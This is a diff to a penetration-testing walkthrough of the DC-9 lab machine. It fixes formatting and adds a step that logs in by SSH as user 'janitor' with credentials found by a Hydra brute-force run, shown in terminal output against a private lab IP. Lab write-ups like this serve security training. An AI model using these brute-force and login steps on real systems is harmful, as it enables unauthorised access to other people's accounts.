@@ -99,7 +99,7 @@ for row in csv_reader:
                 f_password.write(password + "\n")
 ```
 
-Using `usernames.txt``` and `password.txt``` to try logging to target via ssh:
+Using `usernames.txt` and `password.txt` to try logging to target via ssh:
 
 ```sh
 ┌──(kali㉿kali)-[~/Desktop/wallthrough]
@@ -116,3 +116,27 @@ Hydra (https://github.com/vanhauser-thc/thc-hydra) starting at 2022-12-07 23:26:
 1 of 1 target successfully completed, 3 valid passwords found
 Hydra (https://github.com/vanhauser-thc/thc-hydra) finished at 2022-12-07 23:27:16
 ```
+
+Got the valid credentials. SSH to target:
+
+```sh
+┌──(kali㉿kali)-[~/Desktop/wallthrough]
+└─$ ssh janitor@192.168.182.134    
+The authenticity of host '192.168.182.134 (192.168.182.134)' can't be established.
+ED25519 key fingerprint is SHA256:QqKiAU3zrowiN9K1SVvmSWvLBZAqdSpT0aMLTwGlyvo.
+This key is not known by any other names
+Are you sure you want to continue connecting (yes/no/[fingerprint])? yes
+Warning: Permanently added '192.168.182.134' (ED25519) to the list of known hosts.
+janitor@192.168.182.134's password: 
+Linux dc-9 4.19.0-6-amd64 #1 SMP Debian 4.19.67-2+deb10u2 (2019-11-11) x86_64
+
+The programs included with the Debian GNU/Linux system are free software;
+the exact distribution terms for each program are described in the
+individual files in /usr/share/doc/*/copyright.
+
+Debian GNU/Linux comes with ABSOLUTELY NO WARRANTY, to the extent
+permitted by applicable law.
+janitor@dc-9:~$ 
+```
+
+## Privilege Escalation
